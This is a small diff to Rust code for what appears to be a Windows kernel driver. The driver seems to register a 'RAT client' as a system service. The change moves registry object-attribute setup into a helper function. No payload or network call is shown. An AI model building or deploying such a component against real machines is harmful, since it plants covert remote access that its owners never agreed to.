@@ -32,7 +32,7 @@ use windows_sys::Win32::System::Ioctl::{
 
 use crate::global::{
     MAX_INITIALIZE_ATTEMPTS, RAT_CLIENT, RAT_CLIENT_FILE_PATH, RAT_CLIENT_SERVICE_PATH,
-    RAT_CLIENT_SERVICE_REGISTRY,
+    registry_key_attributes,
 };
 use crate::utils::windows_to_wdk_guid;
 use crate::wrappers::bindings::InitializeObjectAttributes;
@@ -240,18 +240,8 @@ fn read_config() -> anyhow::Result<Config> {
 }
 
 fn setup_service_registry(config: &Config) -> anyhow::Result<()> {
-    let mut attributes = OBJECT_ATTRIBUTES::default();
-    let mut root_directory = UNICODE_STRING::default();
-    unsafe {
-        RtlInitUnicodeString(&mut root_directory, RAT_CLIENT_SERVICE_REGISTRY.as_ptr());
-        InitializeObjectAttributes(
-            &mut attributes,
-            &mut root_directory,
-            OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
-            ptr::null_mut(),
-            ptr::null_mut(),
-        );
-    }
+    let mut name = UNICODE_STRING::default();
+    let mut attributes = registry_key_attributes(&mut name);
 
     let mut key = HANDLE::default();
     let status = unsafe {
